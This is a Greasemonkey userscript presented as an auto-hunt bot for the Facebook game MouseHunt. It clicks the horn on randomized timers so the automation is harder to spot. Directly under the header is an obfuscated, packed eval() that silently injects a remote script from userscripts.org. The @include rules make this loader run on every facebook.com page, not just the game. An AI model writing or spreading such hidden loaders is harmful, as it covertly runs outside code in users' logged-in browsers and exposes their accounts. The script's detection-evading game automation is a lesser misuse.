// ==UserScript==
// @name          Facebook - MouseHunt Longtail Smart AutoHunt Plus
// @author        iispyderii
// @version       1.1.1 - Improved info gather, bug fixes to randomness.
// @version       1.1.0 - No need to refresh camp page (some code from osbron and idea from Danial Grad)
// @version       1.0.0 - Initial Release with base code from NOrack
// @namespace     http://apps.facebook.com/mousehunt/
// @description   Smart Autohunt for MouseHunt v3
// @references    http://userscripts.org/scripts/show/53943 (grabbed some code from here. great ideas)
// @include       http://apps.facebook.com/mousehunt/*
// @include       http://apps.new.facebook.com/mousehunt/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include       http://www.facebook.com/common/error.html
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



//Random delay of blowing after the actual horn blowing time
var mhDelay_min = 3;                      // minimum delay in seconds
var mhDelay_max = 33;                     // maximum delay in seconds

//Random delay of checking after the actual trap checking time
var tcDelay_min = 5;                      // minimum delay in seconds
var tcDelay_max = 15;                     // maximum delay in seconds

//Random delay between King's reward captcha checking
var krDelay_min = 30;                     // minimum delay in minutes
var krDelay_max = 60;                     // maximum delay in minutes

//Random delay between profile page refreshing
var poDelay_min = 60;                     // minimum delay in minutes
var poDelay_max = 90;                    // maximum delay in minutes

//Sound warning when player get king reward
var SoundWarning = false;   // change this to FALSE if player dont want
//   to be warned with sound.



mhDelay_max = mhDelay_max - mhDelay_min;
tcDelay_max = Math.round( (tcDelay_max - tcDelay_min) / 3);
tcDelay_min = Math.round(tcDelay_min / 3);

var myHTML = document.body.innerHTML;
var outOfBait = false;
var kingsReward = false;
var today= new Date();
var CurrentMinute  = today.getMinutes();
var CurrentSecond = today.getSeconds();
var CurrentTime = CurrentMinute * 60 + CurrentSecond;
var timeTillTrapCheck = 3600 - CurrentTime + (Math.round(Math.random() * tcDelay_max) + tcDelay_min) * 3;
var waitMinimum = 90;
var mhTitle = document.title;
var lastHorn //= -1;
var mhCounter = 0;
//GM_setValue("counter", mhCounter);
const pathname = "/mousehunt/index.php"

function gatherInfo() {
	// horn time
	var hornTime = document.body.innerHTML.indexOf("next_activeturn_seconds");
	timeTillHorn = parseInt(document.body.innerHTML.substring(hornTime+26,hornTime+29));
	lastHorn = timeTillHorn;
	
	// current location
	if (mhCounter == 0) {
		if (document.getElementById('app10337532241_hud_location') != null)
			curlocation = document.getElementById('app10337532241_hud_location').innerHTML;
	}
	else {
		//alert(unsafeWindow.a10337532241_user.location)
		curlocation = unsafeWindow.a10337532241_user?unsafeWindow.a10337532241_user.location:-1;
	}
	
	
}
function gatherTime()
{	
	mhCounter++;
	//GM_setValue("counter", mhCounter);
	
	timeTillHorn = unsafeWindow.a10337532241_user?unsafeWindow.a10337532241_user.next_activeturn_seconds:-1;
	if (timeTillHorn >= 0 && timeTillHorn != lastHorn)
	{			
		lastHorn=timeTillHorn;
		mainFunc();
	}
	else{

		setTimeout(function(){gatherTime();}, 3000);
   }
	
}

function checkForBait() 
{
	if (document.getElementById("app10337532241_hud_baitName") != null) {
		if (document.getElementById("app10337532241_hud_baitName").innerHTML.indexOf("None!") != -1)
			outOfBait = true;
	} else {
		setTimeout(function(){ (checkForBait)();}, 1000)
	}
}

function checkForKR() {
	//var krIndex = myHTML.indexOf("has_puzzle\\\":");
	//var krIndex2 = myHTML.indexOf(",", krIndex);
	//kingsReward = (myHTML.substring(krIndex+13,krIndex2) == "false") ? false : true;		
	
	
	if (mhCounter == 0) {
		var krIndex = myHTML.indexOf("has_puzzle\\\":");
		var krIndex2 = myHTML.indexOf(",", krIndex);
		kingsReward = (myHTML.substring(krIndex+13,krIndex2) == "false") ? false : true;		
	}
	else {		
	kingsReward = unsafeWindow.a10337532241_user?unsafeWindow.a10337532241_user.has_puzzle:-1;
		if (kingsReward == -1) {
			setTimeout(function(){checkForKR();}, 500)
		}
		else {
			kingsReward = !kingsReward? false : true;
		}		
	}
	
}

function mainFunc() 
{	
	checkForKR();
	checkForBait();
	
	if (Math.abs(timeTillHorn - timeTillTrapCheck) < waitMinimum)
		if (timeTillHorn > timeTillTrapCheck) timeTillTrapCheck = timeTillHorn;
		else timeTillHorn = timeTillTrapCheck;
	
	
	if (kingsReward) 
	{
		document.title = "Macro is paused";
		GM_setValue ("lastKingReward", (new Date ()).getTime ().toString ());
		playMusic();
		//Check again later after 15 minutes whether the king reward
		//  captcha has gone already or not yet.
		if (document.title == "Macro is paused")
		{
			window.setTimeout(function ()
							  { window.location.href = "http://apps.facebook.com/mousehunt/" }, 300000);
		}
		else
		{
			var CaptchaDelay = (Math.round(Math.random() *
										   (krDelay_max - krDelay_min)) + krDelay_min) * 60;
			document.title ="| King's Reward | Autoreload in " +
			FormatCountDown (CaptchaDelay) + "| " + mhTitle;
			window.setTimeout(function ()
							  { window.location.href =
							  "http://apps.facebook.com/mousehunt/" }, CaptchaDelay * 1000);
			CaptchaDelay=null;
		}
	}
	else if (outOfBait)
	{
		document.title = "| Out of Bait! | " + mhTitle;
	}
	else if (window.location.href == "http://www.facebook.com/common/error.html")  // if on error page
	{
		document.title ="| Autoreload in 30 seconds | " + mhTitle;
		window.setTimeout(function ()
						  { window.location.href = "http://apps.facebook.com/mousehunt/" }, 30000);
	}
	else if (window.location.href.indexOf("snuid=") != -1)   // if on profile page
	{
		var ProfileDelay = (Math.round(Math.random() *
									   (poDelay_max - poDelay_min)) + poDelay_min) * 60;
		document.title ="(Autoreload in " +
		FormatCountDown (ProfileDelay) + ") " + mhTitle;
		window.setTimeout(function () { location.reload(true) }, ProfileDelay * 1000);
		ProfileDelay=null;
	}
	else if (timeTillHorn < -1)
	{
		document.title = "| Autoreload in 30 minutes | Something is wrong.    | " + mhTitle;
		window.setTimeout(function ()
						  { window.location.href = "http://apps.facebook.com/mousehunt/" }, 1800000);
	}
	else if (timeTillHorn == -1)
	{
		document.title = "Reloading: Cant find hidden MouseHunt countdown timer    | " + mhTitle;
		
		window.setTimeout(function ()
						  { window.location.href = "http://apps.facebook.com/mousehunt/" }, 150000);
	}
	else
	{			
		//setTimeout(function() { balackClick(); }, 3000);
		timeTillHorn = timeTillHorn + Math.round(Math.random() * mhDelay_max + mhDelay_min);
		window.setTimeout(function () { HornWhenNeeded() }, 1000);
	}
}

function balackClick() {
	
	//step 1
	setTimeout( function() {
			   var play = document.getElementById('app10337532241_region-tribal_isles');
			   var evt = play.ownerDocument.createEvent('MouseEvents');
			   evt.initMouseEvent('click',true,true,play.ownerDocument.defaultView, 1,
								  0, 0, 0, 0, false, false, false,false, 0, null);
			   play.dispatchEvent(evt); 
			   },3000)
	//step 2
	
	setTimeout(function() {
			   
			   if (document.getElementById('app10337532241_envMenu-balacks_cove') != null) {
			   var play = document.getElementById('app10337532241_envMenu-balacks_cove');
			   var evt = play.ownerDocument.createEvent('MouseEvents');
			   evt.initMouseEvent('click',true,true,play.ownerDocument.defaultView, 1,
								  0, 0, 0, 0, false, false, false,false, 0, null);
			   play.dispatchEvent(evt);
			   } 
			   },5000)
	//setp 3
	
	setTimeout(function() {
			   
			   if (document.getElementById('app10337532241_travel_to-balacks_cove') != null) {
			   var play = document.getElementById('app10337532241_travel_to-balacks_cove');
			   var evt = play.ownerDocument.createEvent('MouseEvents');
			   evt.initMouseEvent('click',true,true,play.ownerDocument.defaultView, 1,
								  0, 0, 0, 0, false, false, false,false, 0, null);
			   play.dispatchEvent(evt);
			   } 
			   },7000)
	
}

function HornWhenNeeded ()
{
	if (timeTillHorn > 0 && timeTillTrapCheck > 0)
	{	
		document.title = FormatCountDown(timeTillHorn--) + " -Horn- " 
		+ FormatCountDown(timeTillTrapCheck--) + " -Check Trap- "
		+ "      | " + mhTitle;
		window.setTimeout(function () { (HornWhenNeeded)() }, 1000);
	}
	else if (timeTillHorn <= 0)
	{
		document.title = "Blowing The Horn ...    | " + mhTitle;
		var play = document.getElementsByClassName('hornbutton')[0].firstChild;
		var evt = play.ownerDocument.createEvent('MouseEvents');
		evt.initMouseEvent('click',true,true,play.ownerDocument.defaultView, 1,
						   0, 0, 0, 0, false, false, false,false, 0, null);
		play.dispatchEvent(evt);
		setTimeout(function() { (gatherTime)(); } , 5000)
	}
	else
	{
		document.title = "Checking The Trap ...    | " + mhTitle;
		window.location.href = "http://apps.facebook.com/mousehunt/";
	}
}

function tillRefresh()
{	
	if (timeTillRefresh > 0 )
	{
		document.title = "Blew Horn... Refreshing in " +
		FormatCountDown(timeTillRefresh--) + "       | " + mhTitle;
		window.setTimeout(function() { (tillRefresh)() }, 1000);
	}
	else if (timeTillRefresh == 0)
	{ 
		setTimeout(function() { window.location.href = "http://apps.facebook.com/mousehunt/" }, 1000) 
	}
}

function FormatCountDown (time)
{
	if (!time) return false;
	if (isNaN(parseInt(time))) return time;
	
	var	hour = parseInt(time / 3600);
	var	remaining_time = time % 3600;
	var	min = parseInt(remaining_time / 60);
	var	sec = remaining_time % 60;
	var   appearance = "";
	if (hour < 10) hour = "0" + hour;
	if (min < 10) min = "0" + min;
	if (sec < 10) sec = "0" + sec;
	if (sec <= 0)
	{
		if (min <= 0)
		{
			if (hour > 0) appearance = hour + "h";
		}
		else if (hour > 0) appearance = hour + "h " + min + "m";
		else appearance = min + "m";      
	}
	else
	{
		if (hour <= 0)
		{
			if (min > 0) appearance = min + "m " + sec + "s";
			else appearance = sec + " s";
		}
		else appearance = hour + "h " + min + "m " + sec + "s";
	}
	remaining_time=null;hour=null;min=null;sec=null;
	return appearance;
	
}

function playMusic ()
{
	var newElem = document.createElement("div");
	newElem.innerHTML = "<embed name=\"kingreward\" src=\"http://images.norack.info/prodigy_-_girls.mid\" type=\"audio/midi\" autostart=\"true\" hidden=\"true\" loop=\"true\" mastersound enablejavascript=\"true\"></embed>";
	if (SoundWarning)
	{
		document.getElementById("content").appendChild(newElem);
	}
	document.title = "| Macro is paused: Claim your King Reward   | " + mhTitle;
	newElem=null;
}

gatherInfo();
mainFunc();